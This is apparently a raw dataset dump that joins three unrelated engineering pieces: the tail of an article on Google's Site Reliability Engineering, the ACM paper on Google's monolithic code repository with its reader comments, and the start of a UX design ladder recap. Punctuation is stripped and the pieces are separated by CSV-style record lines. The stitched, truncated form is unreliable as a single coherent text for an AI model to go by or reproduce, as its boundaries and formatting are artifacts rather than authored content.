is what happens when you ask a software engineer to design an operations team   he says   I designed and managed the group the way I would want it to work if I worked as an SRE myself    For Todd Underwood  now an SRE director at Google  it s only natural that the company would hire a coder like Sloss for the job   When Google was in its infancy  there were so many software engineers who had a better sense of how things broke and a better sense of how engineering could be done well   he tells WIRED   But not one them wanted to do any of that by hand    That s a very Googly thing to say  But Adam Jacob  chief technology officer at Chef  pretty much agrees  explaining that this is the expected transition for an online operation that s growing to such a large size   It s natural to have a conversation to combine software development and the practical pieces of operation and to have no real divide between the two   he says   When you look at the problem holistically  you get better results    The shift is particularly interesting when you consider that dev and ops were traditionally opposing forces  The devs wanted to build new software and change it and get the changes out to the public as a fast as possible  But the ops folks wanted to ensure that nothing went wrong  and the best way to do that was to keep changes to a minimum   These are incommensurate goals   Underwood says  The trick is that  if you combine dev and ops  you can start to eliminate their competing aims   Underwood calls it a  Hegelian thesis antithesis synthesis   He then acknowledges that when he says this  no one really buys it   People just don t read Hegel anymore   he quips  But the description is spot on  And once this synthesis was in place  Google accelerated the process by adding all sorts of other Googly ideas to the mix   The Error Budget  One big idea is that  in an effort to reduce the conflict between dev and ops  the company doesn t strive for 100 percent uptime  The reality  Sloss writes  is that you don t need an internet service to be 100 percent available  Users can t really tell the difference between 100 percent and  say  99 999 percent  their laptop or WiFi or electricity or ISP are down far more than 0 001 percent of the time   If you set a reasonable uptime goal below 100 percent an  error budget  you have more room to make changes and roll out experiments    The use of an error budget resolves the structural conflict of incentives between development and SRE   Slosser says   An outage is no longer a  bad  thing  It is an expected part of the process of innovation  and an occurrence that both development and SRE teams manage rather than fear    At the same time  the company put rules in place to ensure that SREs didn t end up morphing into good old fashioned sysadmins  Basically  it decreed that no SRE could spent more than 50 percent of his or her time on traditional operations as opposed to coding  If ops starts to take precedence over dev on a particular SRE team  Google shifts some of the ops load onto the team that typically just builds the software the regular Google software engineers   Consciously maintaining this balance between ops and development work allows us to ensure that SREs have the bandwidth to engage in creative  autonomous engineering   Sloss writes   while still retaining the wisdom gleaned from the operations side of running a service    Chef s Jacob says that the ratio here 50 percent isn t that important  But he likes the attitude   This is just economics   he says   There s always demand for people to do operational bullshit  There is an almost infinite amount of bullshit that people will ask an operational person to do  So the idea that you would put a cap on that it legit    Google even created strict guidelines for hiring its SREs  It hires about 50 to 60 percent through exactly the same process that applies to all other Google engineers  and the rest have about  85 to 99 percent  of the same skills plus a  set of technical skills that is useful to SRE but is rare for most software engineers   such as an intimate knowledge of the inside of the UNIX operating system or hardware networking protocols  This too aims to ensure that dev and ops maintain the proper balance   The Moonshot That Keeps Google Online  In many ways  this was a new philosophy  But in their book  as they seek to describe the philosophy  the Google team uses a much older example  The spiritual forebear of the Google SREs is Margaret Hamilton  the MIT programmer who spent the  60s building software for Apollo spacecraft that would one day land on the moon  As explained by Hamilton herself who was interviewed for the book part of the culture on the Apollo program  was to learn from everyone and everything  including from that which one would least expect    Hamilton was a coder  But she played an important role in operations  To show this  the book recounts the day Hamilton s young daughter  Lauren  who she often brought to the computer lab  happened to hit a button and feed an Apollo pre launch program into a computer that was running a post launch scenario   This crashed the scenario  and Hamilton tried to add a new error checking code to the system that automatically would prevent this during a real flight  Her superiors rejected the idea  arguing that astronauts would never do such a thing  but on Apollo 8  the astronauts did such a thing  Luckily  Hamilton had added a workaround to the system documentation  And for subsequent missions  she added the error checking code    If you come along and say  That s going to break   it s really not that useful  But if you say   That s going to break  and let me tell you how   you ve done something amazing   Underwood explains   Here s a person who saw that something was going to break and saw how it was going to break and devised a way to prevent it from breaking    That s DevOps or  in Google parlance  Site Reliability Engineering  As three words  it doesn t sound like much  But it s an enormously powerful idea  It has already produced Google  But particularly philosophical SREs like Underwood have even bigger ambitions  They envision a world where operations shift even further towards code   We long for the day   Underwood says   when nobody runs anything,"[712 713 541 778 251 1373 298 61 1351 806 794]"
713,training-dataset/engineering/5.txt,engineering,Why Google Stores Billions of Lines of Code in a Single RepositoryContributed articles Why Google Stores Billions of Lines of Code in a Single Repository  Early Google employees decided to work with a shared codebase managed through a centralized source control system  This approach has served Google well for more than 16 years  and today the vast majority of Google s software assets continues to be stored in a single  shared repository  Meanwhile  the number of Google software developers has steadily increased  and the size of the Google codebase has grown exponentially  see Figure 1   As a result  the technology used to host the codebase has also evolved significantly   Back to Top  Key Insights  This article outlines the scale of that codebase and details Google s custom built monolithic source repository and the reasons the model was chosen  Google uses a homegrown version control system to host one large codebase visible to  and used by  most of the software developers in the company  This centralized system is the foundation of many of Google s developer workflows  Here  we provide background on the systems and workflows that make feasible managing and working productively with such a large repository  We explain Google s  trunk based development  strategy and the support systems that structure workflow and keep Google s codebase healthy  including software for static analysis  code cleanup  and streamlined code review   Back to Top  Google Scale  Google s monolithic software repository  which is used by 95  of its software developers worldwide  meets the definition of an ultra large scale4 system  providing evidence the single source repository model can be scaled successfully   The Google codebase includes approximately one billion files and has a history of approximately 35 million commits spanning Google s entire 18 year existence  The repository contains 86TBa of data  including approximately two billion lines of code in nine million unique source files  The total number of files also includes source files copied into release branches  files that are deleted at the latest revision  configuration files  documentation  and supporting data files  see the table here for a summary of Google s repository statistics from January 2015   In 2014  approximately 15 million lines of code were changedb in approximately 250 000 files in the Google repository on a weekly basis  The Linux kernel is a prominent example of a large open source software repository containing approximately 15 million lines of code in 40 000 files 14  Google s codebase is shared by more than 25 000 Google software developers from dozens of offices in countries around the world  On a typical workday  they commit 16 000 changes to the codebase  and another 24 000 changes are committed by automated systems  Each day the repository serves billions of file read requests  with approximately 800 000 queries per second during peak traffic and an average of approximately 500 000 queries per second each workday  Most of this traffic originates from Google s distributed build and test systems c  Figure 2 reports the number of unique human committers per week to the main repository  January 2010 July 2015  Figure 3 reports commits per week to Google s main repository over the same time period  The line for total commits includes data for both the interactive use case  or human users  and automated use cases  Larger dips in both graphs occur during holidays affecting a significant number of employees  such as Christmas Day and New Year s Day  American Thanksgiving Day  and American Independence Day    In October 2012  Google s central repository added support for Windows and Mac users  until then it was Linux only   and the existing Windows and Mac repository was merged with the main repository  Google s tooling for repository merges attributes all historical changes being merged to their original authors  hence the corresponding bump in the graph in Figure 2  The effect of this merge is also apparent in Figure 1   The commits per week graph shows the commit rate was dominated by human users until 2012  at which point Google switched to a custom source control implementation for hosting the central repository  as discussed later  Following this transition  automated commits to the repository began to increase  Growth in the commit rate continues primarily due to automation   Managing this scale of repository and activity on it has been an ongoing challenge for Google  Despite several years of experimentation  Google was not able to find a commercially available or open source version control system to support such scale in a single repository  The Google proprietary system that was built to store  version  and vend this codebase is code named Piper   Back to Top  Background  Before reviewing the advantages and disadvantages of working with a monolithic repository  some background on Google s tooling and workflows is needed   Piper and CitC  Piper stores a single large repository and is implemented on top of standard Google infrastructure  originally Bigtable 2 now Spanner 3 Piper is distributed over 10 Google data centers around the world  relying on the Paxos6 algorithm to guarantee consistency across replicas  This architecture provides a high level of redundancy and helps optimize latency for Google software developers  no matter where they work  In addition  caching and asynchronous operations hide much of the network latency from developers  This is important because gaining the full benefit of Google s cloud based toolchain requires developers to be online   Google relied on one primary Perforce instance  hosted on a single machine  coupled with custom caching infrastructure1 for more than 10 years prior to the launch of Piper  Continued scaling of the Google repository was the main motivation for developing Piper   Since Google s source code is one of the company s most important assets  security features are a key consideration in Piper s design  Piper supports file level access control lists  Most of the repository is visible to all Piper users d however  important configuration files or files including business critical algorithms can be more tightly controlled  In addition  read and write access to files in Piper is logged  If sensitive data is accidentally committed to Piper  the file in question can be purged  The read logs allow administrators to determine if anyone accessed the problematic file before it was removed   In the Piper workflow  see Figure 4   developers create a local copy of files in the repository before changing them  These files are stored in a workspace owned by the developer  A Piper workspace is comparable to a working copy in Apache Subversion  a local clone in Git  or a client in Perforce  Updates from the Piper repository can be pulled into a workspace and merged with ongoing work  as desired  see Figure 5   A snapshot of the workspace can be shared with other developers for review  Files in a workspace are committed to the central repository only after going through the Google code review process  as described later   Most developers access Piper through a system called Clients in the Cloud  or CitC  which consists of a cloud based storage backend and a Linux only FUSE13 file system  Developers see their workspaces as directories in the file system  including their changes overlaid on top of the full Piper repository  CitC supports code browsing and normal Unix tools with no need to clone or sync state locally  Developers can browse and edit files anywhere across the Piper repository  and only modified files are stored in their workspace  This structure means CitC workspaces typically consume only a small amount of storage  an average workspace has fewer than 10 files  while presenting a seamless view of the entire Piper codebase to the developer   All writes to files are stored as snapshots in CitC  making it possible to recover previous stages of work as needed  Snapshots may be explicitly named  restored  or tagged for review   CitC workspaces are available on any machine that can connect to the cloud based storage system  making it easy to switch machines and pick up work without interruption  It also makes it possible for developers to view each other s work in CitC workspaces  Storing all in progress work in the cloud is an important element of the Google workflow process  Working state is thus available to other tools  including the cloud based build system  the automated test infrastructure  and the code browsing  editing  and review tools   Several workflows take advantage of the availability of uncommitted code in CitC to make software developers working with the large codebase more productive  For instance  when sending a change out for code review  developers can enable an auto commit option  which is particularly useful when code authors and reviewers are in different time zones  When the review is marked as complete  the tests will run  if they pass  the code will be committed to the repository without further human intervention  The Google code browsing tool CodeSearch supports simple edits using CitC workspaces  While browsing the repository  developers can click on a button to enter edit mode and make a simple change  such as fixing a typo or improving a comment   Then  without leaving the code browser  they can send their changes out to the appropriate reviewers with auto commit enabled   Piper can also be used without CitC  Developers can instead store Piper workspaces on their local machines  Piper also has limited interoperability with Git  Over 80  of Piper users today use CitC  with adoption continuing to grow due to the many benefits provided by CitC   Piper and CitC make working productively with a single  monolithic source repository possible at the scale of the Google codebase  The design and architecture of these systems were both heavily influenced by the trunk based development paradigm employed at Google  as described here   Trunk based development  Google practices trunk based development on top of the Piper source repository  The vast majority of Piper users work at the  head   or most recent  version of a single copy of the code called  trunk  or  mainline   Changes are made to the repository in a single  serial ordering  The combination of trunk based development with a central repository defines the monolithic codebase model  Immediately after any commit  the new code is visible to  and usable by  all other developers  The fact that Piper users work on a single consistent view of the Google codebase is key for providing the advantages described later in this article   Trunk based development is beneficial in part because it avoids the painful merges that often occur when it is time to reconcile long lived branches  Development on branches is unusual and not well supported at Google  though branches are typically used for releases  Release branches are cut from a specific revision of the repository  Bug fixes and enhancements that must be added to a release are typically developed on mainline  then cherry picked into the release branch  see Figure 6   Due to the need to maintain stability and limit churn on the release branch  a release is typically a snapshot of head  with an optional small number of cherry picks pulled in from head as needed  Use of long lived branches with parallel development on the branch and mainline is exceedingly rare   Piper and CitC make working productively with a single  monolithic source repository possible at the scale of the Google codebase   When new features are developed  both new and old code paths commonly exist simultaneously  controlled through the use of conditional flags  This technique avoids the need for a development branch and makes it easy to turn on and off features through configuration updates rather than full binary releases  While some additional complexity is incurred for developers  the merge problems of a development branch are avoided  Flag flips make it much easier and faster to switch users off new implementations that have problems  This method is typically used in project specific code  not common library code  and eventually flags are retired so old code can be deleted  Google uses a similar approach for routing live traffic through different code paths to perform experiments that can be tuned in real time through configuration changes  Such A B experiments can measure everything from the performance characteristics of the code to user engagement related to subtle product changes   Google workflow  Several best practices and supporting systems are required to avoid constant breakage in the trunk based development model  where thousands of engineers commit thousands of changes to the repository on a daily basis  For instance  Google has an automated testing infrastructure that initiates a rebuild of all affected dependencies on almost every change committed to the repository  If a change creates widespread build breakage  a system is in place to automatically undo the change  To reduce the incidence of bad code being committed in the first place  the highly customizable Google  presubmit  infrastructure provides automated testing and analysis of changes before they are added to the codebase  A set of global presubmit analyses are run for all changes  and code owners can create custom analyses that run only on directories within the codebase they specify  A small set of very low level core libraries uses a mechanism similar to a development branch to enforce additional testing before new versions are exposed to client code   An important aspect of Google culture that encourages code quality is the expectation that all code is reviewed before being committed to the repository  Most developers can view and propose changes to files anywhere across the entire codebase with the exception of a small set of highly confidential code that is more carefully controlled  The risk associated with developers changing code they are not deeply familiar with is mitigated through the code review process and the concept of code ownership  The Google codebase is laid out in a tree structure  Each and every directory has a set of owners who control whether a change to files in their directory will be accepted  Owners are typically the developers who work on the projects in the directories in question  A change often receives a detailed code review from one developer  evaluating the quality of the change  and a commit approval from an owner  evaluating the appropriateness of the change to their area of the codebase   Code reviewers comment on aspects of code quality  including design  functionality  complexity  testing  naming  comment quality  and code style  as documented by the various language specific Google style guides e Google has written a code review tool called Critique that allows the reviewer to view the evolution of the code and comment on any line of the change  It encourages further revisions and a conversation leading to a final  Looks Good To Me  from the reviewer  indicating the review is complete   Google s static analysis system  Tricorder10  and presubmit infrastructure also provide data on code quality  test coverage  and test results automatically in the Google code review tool  These computationally intensive checks are triggered periodically  as well as when a code change is sent for review  Tricorder also provides suggested fixes with one click code editing for many errors  These systems provide important data to increase the effectiveness of code reviews and keep the Google codebase healthy   A team of Google developers will occasionally undertake a set of wide reaching code cleanup changes to further maintain the health of the codebase  The developers who perform these changes commonly separate them into two phases  With this approach  a large backward compatible change is made first  Once it is complete  a second smaller change can be made to remove the original pattern that is no longer referenced  A Google tool called Rosief supports the first phase of such large scale cleanups and code changes  With Rosie  developers create a large patch  either through a find and replace operation across the entire repository or through more complex refactoring tools  Rosie then takes care of splitting the large patch into smaller patches  testing them independently  sending them out for code review  and committing them automatically once they pass tests and a code review  Rosie splits patches along project directory lines  relying on the code ownership hierarchy described earlier to send patches to the appropriate reviewers   Figure 7 reports the number of changes committed through Rosie on a monthly basis  demonstrating the importance of Rosie as a tool for performing large scale code changes at Google  Using Rosie is balanced against the cost incurred by teams needing to review the ongoing stream of simple changes Rosie generates  As Rosie s popularity and usage grew  it became clear some control had to be established to limit Rosie s use to high value changes that would be distributed to many reviewers  rather than to single atomic changes or rejected  In 2013  Google adopted a formal large scale change review process that led to a decrease in the number of commits through Rosie from 2013 to 2014  In evaluating a Rosie change  the review committee balances the benefit of the change against the costs of reviewer time and repository churn  We later examine this and similar trade offs more closely   In sum  Google has developed a number of practices and tools to support its enormous monolithic codebase  including trunk based development  the distributed source code repository Piper  the workspace client CitC  and workflow support tools Critique  CodeSearch  Tricorder  and Rosie  We discuss the pros and cons of this model here   Back to Top  Analysis  This section outlines and expands upon both the advantages of a monolithic codebase and the costs related to maintaining such a model at scale   Advantages  Supporting the ultra large scale of Google s codebase while maintaining good performance for tens of thousands of users is a challenge  but Google has embraced the monolithic model due to its compelling advantages   Most important  it supports   Unified versioning  one source of truth   Extensive code sharing and reuse   Simplified dependency management   Atomic changes   Large scale refactoring   Collaboration across teams   Flexible team boundaries and code ownership  and  Code visibility and clear tree structure providing implicit team namespacing   A single repository provides unified versioning and a single source of truth  There is no confusion about which repository hosts the authoritative version of a file  If one team wants to depend on another team s code  it can depend on it directly  The Google codebase includes a wealth of useful libraries  and the monolithic repository leads to extensive code sharing and reuse   The Google build system5 makes it easy to include code across directories  simplifying dependency management  Changes to the dependencies of a project trigger a rebuild of the dependent code  Since all code is versioned in the same repository  there is only ever one version of the truth  and no concern about independent versioning of dependencies   Most notably  the model allows Google to avoid the  diamond dependency  problem  see Figure 8  that occurs when A depends on B and C  both B and C depend on D  but B requires version D 1 and C requires version D 2  In most cases it is now impossible to build A  For the base library D  it can become very difficult to release a new version without causing breakage  since all its callers must be updated at the same time  Updating is difficult when the library callers are hosted in different repositories   In the open source world  dependencies are commonly broken by library updates  and finding library versions that all work together can be a challenge  Updating the versions of dependencies can be painful for developers  and delays in updating create technical debt that can become very expensive  In contrast  with a monolithic source tree it makes sense  and is easier  for the person updating a library to update all affected dependencies at the same time  The technical debt incurred by dependent systems is paid down immediately as changes are made  Changes to base libraries are instantly propagated through the dependency chain into the final products that rely on the libraries  without requiring a separate sync or migration step   Note the diamond dependency problem can exist at the source API level  as described here  as well as between binaries 12 At Google  the binary problem is avoided through use of static linking   The ability to make atomic changes is also a very powerful feature of the monolithic model  A developer can make a major change touching hundreds or thousands of files across the repository in a single consistent operation  For instance  a developer can rename a class or function in a single commit and yet not break any builds or tests   The availability of all source code in a single repository  or at least on a centralized server  makes it easier for the maintainers of core libraries to perform testing and performance benchmarking for high impact changes before they are committed  This approach is useful for exploring and measuring the value of highly disruptive changes  One concrete example is an experiment to evaluate the feasibility of converting Google data centers to support non x86 machine architectures   With the monolithic structure of the Google repository  a developer never has to decide where the repository boundaries lie  Engineers never need to  fork  the development of a shared library or merge across repositories to update copied versions of code  Team boundaries are fluid  When project ownership changes or plans are made to consolidate systems  all code is already in the same repository  This environment makes it easy to do gradual refactoring and reorganization of the codebase  The change to move a project and update all dependencies can be applied atomically to the repository  and the development history of the affected code remains intact and available   Another attribute of a monolithic repository is the layout of the codebase is easily understood  as it is organized in a single tree  Each team has a directory structure within the main tree that effectively serves as a project s own namespace  Each source file can be uniquely identified by a single string a file path that optionally includes a revision number  Browsing the codebase  it is easy to understand how any source file fits into the big picture of the repository   The Google codebase is constantly evolving  More complex codebase modernization efforts  such as updating it to C  11 or rolling out performance optimizations9  are often managed centrally by dedicated codebase maintainers  Such efforts can touch half a million variable declarations or function call sites spread across hundreds of thousands of files of source code  Because all projects are centrally stored  teams of specialists can do this work for the entire company  rather than require many individuals to develop their own tools  techniques  or expertise   As an example of how these benefits play out  consider Google s Compiler team  which ensures developers at Google employ the most up to date toolchains and benefit from the latest improvements in generated code and  debuggability   The monolithic repository provides the team with full visibility of how various languages are used at Google and allows them to do codebase wide cleanups to prevent changes from breaking builds or creating issues for developers  This greatly simplifies compiler validation  thus reducing compiler release cycles and making it possible for Google to safely do regular compiler releases  typically more than 20 per year for the C   compilers    Using the data generated by performance and regression tests run on nightly builds of the entire Google codebase  the Compiler team tunes default compiler settings to be optimal  For example  due to this centralized effort  Google s Java developers all saw their garbage collection  GC  CPU consumption decrease by more than 50  and their GC pause time decrease by 10  40  from 2014 to 2015  In addition  when software errors are discovered  it is often possible for the team to add new warnings to prevent reoccurrence  In conjunction with this change  they scan the entire repository to find and fix other instances of the software issue being addressed  before turning to new compiler errors  Having the compiler reject patterns that proved problematic in the past is a significant boost to Google s overall code health   Storing all source code in a common version control repository allows codebase maintainers to efficiently analyze and change Google s source code  Tools like Refaster11 and ClangMR15  often used in conjunction with Rosie  make use of the monolithic view of Google s source to perform high level transformations of source code  The monolithic codebase captures all dependency information  Old APIs can be removed with confidence  because it can be proven that all callers have been migrated to new APIs  A single common repository vastly simplifies these tools by ensuring atomicity of changes and a single global view of the entire repository at any given time   An important aspect of Google culture that encourages code quality is the expectation that all code is reviewed before being committed to the repository   Costs and trade offs  While important to note a monolithic codebase in no way implies monolithic software design  working with this model involves some downsides  as well as trade offs  that must be considered   These costs and trade offs fall into three categories   Tooling investments for both development and execution   Codebase complexity  including unnecessary dependencies and difficulties with code discovery  and  Effort invested in code health   In many ways the monolithic repository yields simpler tooling since there is only one system of reference for tools working with source  However  it is also necessary that tooling scale to the size of the repository  For instance  Google has written a custom plug in for the Eclipse integrated development environment  IDE  to make working with a massive codebase possible from the IDE  Google s code indexing system supports static analysis  cross referencing in the code browsing tool  and rich IDE functionality for Emacs  Vim  and other development environments  These tools require ongoing investment to manage the ever increasing scale of the Google codebase   Beyond the investment in building and maintaining scalable tooling  Google must also cover the cost of running these systems  some of which are very computationally intensive  Much of Google s internal suite of developer tools  including the automated test infrastructure and highly scalable build infrastructure  are critical for supporting the size of the monolithic codebase  It is thus necessary to make trade offs concerning how frequently to run this tooling to balance the cost of execution vs  the benefit of the data provided to developers   The monolithic model makes it easier to understand the structure of the codebase  as there is no crossing of repository boundaries between dependencies  However  as the scale increases  code discovery can become more difficult  as standard tools like grep bog down  Developers must be able to explore the codebase  find relevant libraries  and see how to use them and who wrote them  Library authors often need to see how their APIs are being used  This requires a significant investment in code search and browsing tools  However  Google has found this investment highly rewarding  improving the productivity of all developers  as described in more detail by Sadowski et al 9  Access to the whole codebase encourages extensive code sharing and reuse  Some would argue this model  which relies on the extreme scalability of the Google build system  makes it too easy to add dependencies and reduces the incentive for software developers to produce stable and well thought out APIs   Due to the ease of creating dependencies  it is common for teams to not think about their dependency graph  making code cleanup more error prone  Unnecessary dependencies can increase project exposure to downstream build breakages  lead to binary size bloating  and create additional work in building and testing  In addition  lost productivity ensues when abandoned projects that remain in the repository continue to be updated and maintained   Several efforts at Google have sought to rein in unnecessary dependencies  Tooling exists to help identify and remove unused dependencies  or dependencies linked into the product binary for historical or accidental reasons  that are not needed  Tooling also exists to identify underutilized dependencies  or dependencies on large libraries that are mostly unneeded  as candidates for refactoring 7 One such tool  Clipper  relies on a custom Java compiler to generate an accurate cross reference index  It then uses the index to construct a reachability graph and determine what classes are never used  Clipper is useful in guiding dependency refactoring efforts by finding targets that are relatively easy to remove or break up   A developer can make a major change touching hundreds or thousands of files across the repository in a single consistent operation   Dependency refactoring and cleanup tools are helpful  but  ideally  code owners should be able to prevent unwanted dependencies from being created in the first place  In 2011  Google started relying on the concept of API visibility  setting the default visibility of new APIs to  private   This forces developers to explicitly mark APIs as appropriate for use by other teams  A lesson learned from Google s experience with a large monolithic repository is such mechanisms should be put in place as soon as possible to encourage more hygienic dependency structures   The fact that most Google code is available to all Google developers has led to a culture where some teams expect other developers to read their code rather than providing them with separate user documentation  There are pros and cons to this approach  No effort goes toward writing or keeping documentation up to date  but developers sometimes read more than the API code and end up relying on underlying implementation details  This behavior can create a maintenance burden for teams that then have trouble deprecating features they never meant to expose to users   This model also requires teams to collaborate with one another when using open source code  An area of the repository is reserved for storing open source code  developed at Google or externally   To prevent dependency conflicts  as outlined earlier  it is important that only one version of an open source project be available at any given time  Teams that use open source software are expected to occasionally spend time upgrading their codebase to work with newer versions of open source libraries when library upgrades are performed   Google invests significant effort in maintaining code health to address some issues related to codebase complexity and dependency management  For instance  special tooling automatically detects and removes dead code  splits large refactorings and automatically assigns code reviews  as through Rosie   and marks APIs as deprecated  Human effort is required to run these tools and manage the corresponding large scale code changes  A cost is also incurred by teams that need to review an ongoing stream of simple refactorings resulting from codebase wide clean ups and centralized modernization efforts   Back to Top  Alternatives  As the popularity and use of distributed version control systems  DVCSs  like Git have grown  Google has considered whether to move from Piper to Git as its primary version control system  A team at Google is focused on supporting Git  which is used by Google s Android and Chrome teams outside the main Google repository  The use of Git is important for these teams due to external partner and open source collaborations   The Git community strongly suggests and prefers developers have more and smaller repositories  A Git clone operation requires copying all content to one s local machine  a procedure incompatible with a large repository  To move to Git based source hosting  it would be necessary to split Google s repository into thousands of separate repositories to achieve reasonable performance  Such reorganization would necessitate cultural and workflow changes for Google s developers  As a comparison  Google s Git hosted Android codebase is divided into more than 800 separate repositories   Given the value gained from the existing tools Google has built and the many advantages of the monolithic codebase structure  it is clear that moving to more and smaller repositories would not make sense for Google s main repository  The alternative of moving to Git or any other DVCS that would require repository splitting is not compelling for Google   Current investment by the Google source team focuses primarily on the ongoing reliability  scalability  and security of the in house source systems  The team is also pursuing an experimental effort with Mercurial g an open source DVCS similar to Git  The goal is to add scalability features to the Mercurial client so it can efficiently support a codebase the size of Google s  This would provide Google s developers with an alternative of using popular DVCS style workflows in conjunction with the central repository  This effort is in collaboration with the open source Mercurial community  including contributors from other companies that value the monolithic source model   Back to Top  Conclusion  Google chose the monolithic source management strategy in 1999 when the existing Google codebase was migrated from CVS to Perforce  Early Google engineers maintained that a single repository was strictly better than splitting up the codebase  though at the time they did not anticipate the future scale of the codebase and all the supporting tooling that would be built to make the scaling feasible   Over the years  as the investment required to continue scaling the centralized repository grew  Google leadership occasionally considered whether it would make sense to move from the monolithic model  Despite the effort required  Google repeatedly chose to stick with the central repository due to its advantages   The monolithic model of source code management is not for everyone  It is best suited to organizations like Google  with an open and collaborative culture  It would not work well for organizations where large parts of the codebase are private or hidden between groups   At Google  we have found  with some investment  the monolithic model of source management can scale successfully to a codebase with more than one billion files  35 million commits  and thousands of users around the globe  As the scale and complexity of projects both inside and outside Google continue to grow  we hope the analysis and workflow described in this article can benefit others weighing decisions on the long term structure for their codebases   Back to Top  Acknowledgments  We would like to recognize all current and former members of the Google Developer Infrastructure teams for their dedication in building and maintaining the systems referenced in this article  as well as the many people who helped in reviewing the article  in particular  Jon Perkins and Ingo Walther  the current Tech Leads of Piper  Kyle Lippincott and Crutcher Dunnavant  the current and former Tech Leads of CitC  Hyrum Wright  Google s large scale refactoring guru  and Chris Colohan  Caitlin Sadowski  Morgan Ames  Rob Siemborski  and the Piper and CitC development and support teams for their insightful review comments   Back to Top  References 1  Bloch  D  Still All on One Server  Perforce at Scale  Google White Paper  2011  http   info perforce com rs perforce images GoogleWhitePaper StillAllonOneServer PerforceatScale pdf 2  Chang  F   Dean  J   Ghemawat  S   Hsieh  W C   Wallach  D A   Burrows  M   Chandra  T   Fikes  A   and Gruber  R E  Bigtable  A distributed storage system for structured data  ACM Transactions on Computer Systems 26  2  June 2008   3  Corbett  J C   Dean  J   Epstein  M   Fikes  A   Frost  C   Furman  J   Ghemawat  S   Gubarev  A   Heiser  C   Hochschild  P  et al  Spanner  Google s globally distributed database  ACM Transactions on Computer Systems 31  3  Aug  2013   4  Gabriel  R P   Northrop  L   Schmidt  D C   and Sullivan  K  Ultra large scale systems  In Companion to the 21st ACM SIGPLAN Symposium on Object Oriented Programming Systems  Languages  and Applications  Portland  OR  Oct  22 26   ACM Press  New York  2006  632 634  5  Kemper  C  Build in the Cloud  How the Build System works  Google Engineering Tools blog post  2011  http   google engtools blogspot com 2011 08 build in cloud how build system works html 6  Lamport  L  Paxos made simple  ACM Sigact News 32  4  Nov  2001   18 25  7  Morgenthaler  J D   Gridnev  M   Sauciuc  R   and Bhansali  S  Searching for build debt  Experiences managing technical debt at Google  In Proceedings of the Third International Workshop on Managing Technical Debt  Z rich  Switzerland  June 2 9   IEEE Press Piscataway  NJ  2012  1 6  8  Ren  G   Tune  E   Moseley  T   Shi  Y   Rus  S   and Hundt  R  Google wide profiling  A continuous profiling infrastructure for data centers  IEEE Micro 30  4  2010   65 79  9  Sadowski  C   Stolee  K   and Elbaum  S  How developers search for code  A case study  In Proceedings of the 10th Joint Meeting on Foundations of Software Engineering  Bergamo  Italy  Aug  30 Sept  4   ACM Press  New York  2015  191 201  10  Sadowski  C   van Gogh  J   Jaspan  C   Soederberg  E   and Winter  C  Tricorder  Building a program analysis ecosystem  In Proceedings of the 37th International Conference on Software Engineering  Vol  1  Firenze  Italy  May 16 24   IEEE Press Piscataway  NJ  2015  598 608  11  Wasserman  L  Scalable  example based refactorings with Refaster  In Proceedings of the 2013 ACM Workshop on Refactoring Tools  Indianapolis  IN  Oct  26 31   ACM Press  New York  2013  25 28  12  Wikipedia  Dependency hell  Accessed Jan  20  2015  http   en wikipedia org w index php title Dependency_hell oldid 634636715 13  Wikipedia  Filesystem in userspace  Accessed June  4  2015  http   en wikipedia org w index php title Filesystem_in_Userspace oldid 664776514 14  Wikipedia  Linux kernel  Accessed Jan  20  2015  http   en wikipedia org w index php title Linux_kernel oldid 643170399 15  Wright  H K   Jasper  D   Klimek  M   Carruth  C   and Wan  Z  Large scale automated refactoring using ClangMR  In Proceedings of the IEEE International Conference on Software Maintenance  Eindhoven  The Netherlands  Sept  22 28   IEEE Press  2013  548 551   Back to Top  Authors Rachel Potvin  rpotvin google com  is an engineering manager at Google  Mountain View  CA  Josh Levenberg  joshl google com  is a software engineer at Google  Mountain View  CA   Back to Top  Back to Top  Figures Figure 1  Millions of changes committed to Google s central repository over time  Figure 2  Human committers per week  Figure 3  Commits per week  Figure 4  Piper workflow  Figure 5  Piper team logo  Piper is Piper expanded recursively   design source  Kirrily Anderson  Figure 6  Release branching model  Figure 7  Rosie commits per month  Figure 8  Diamond dependency problem   Back to Top  Tables Table  Google repository statistics  January 2015   Back to top  Copyright held by the authors  The Digital Library is published by the Association for Computing Machinery  Copyright   2016 ACM  Inc   Comments  Robert Fink  I m curious to understand the interplay of the source code model  monolithic repository vs many repositories  and the deployment model  in particular when considering continuous deployment vs  explicit releases     My understanding is that Google services are compiled deployed from trunk  what does this mean for database migrations  e g   schema upgrades   in particular when different instances of the same service are maintained by different teams  How do you coordinate such distributed data migrations in the face of more or less continuous upgrades of binaries  There there isn t a notion of a released  stable version of a package  do you require effectively infinite backwards compatibility     Similarly  when a service is deployed from today s trunk  but a dependent service is still running on last week s trunk  how is API compatibility guaranteed between those services   It seems that stringent contracts for cross service API and schema compatibility need to be in place to prevent breakages as a result from live upgrades   Curious to hear your thoughts  thanks   Robert  Ed Chi  Teams can package up their own binaries that run in production data centers   There is effectively a SLA between the team that publish the binary and the clients that uses them  If you don t like the SLA  including backwards compatibility   you are free to compile your own binary package to run in production   Migration is usually done in a three step process  announce  new code and move over  then deprecate old code by deletion   Kevin Schultz  Section  Background   paragraph five  states   Updates from the Piper repository can be pulled into a workspace and merged with ongoing work  as desired  see Figure 5     However  Figure 5 seems to link to  Piper team logo  Piper is Piper expanded recursively   design source  Kirrily Anderson    Please clarify  thank you   Displaying all 3 comments,"[713 712 1399 1027 1225 683 895 206 656 1336 1351]"
714,training-dataset/product/217.txt,product,Climbing the UX Design Success LadderDesigning functional or even usable experiences isn t enough  Sites and software products that deliver value to businesses and end users climb to higher rungs of the Design Success Ladder because they re comfortable  delightful  and meaningful   We hosted a DesignTalk with Ward Andrews from Drawbackwards and Design org  and Ward walked us through the rungs of the ladder and suggested ways to improve user experience in websites and software   Watch Ward s full talk below  or read on for our short recap   All businesses are starting to understand that they need to deliver a great customer and user experience  However  even just recently  many businesses had an industrial age mindset where they believed as long as the company was efficient  they could succeed  Now  companies must still be efficient  but they re also competing on new ideals like delight and meaning   Ward created the Design Success Ladder to bring a shared understanding and shared language to business when discussing UX  The ladder shows levels of quality for user experience and provides higher levels to aspire to   The rungs  The bottom rung of the ladder is when a product is functional  That means the product is okay and works most of the time if you take the time to figure it out   A step up from functional is usable  Ward said usable is 100  better than functional  Users can complete tasks without major frustrations   A step up from usable is comfortable  This can also be called intuitive things are in the right place   A step up from comfortable is delightful  The product is easy to use and actually surprises users  activating positive emotions   Finally  the top rung of the ladder is meaningful  This is the Holy Grail of products  They create meaning in users  lives  They can change not only an individual s behavior  but also the economy and the world   The ladder shows 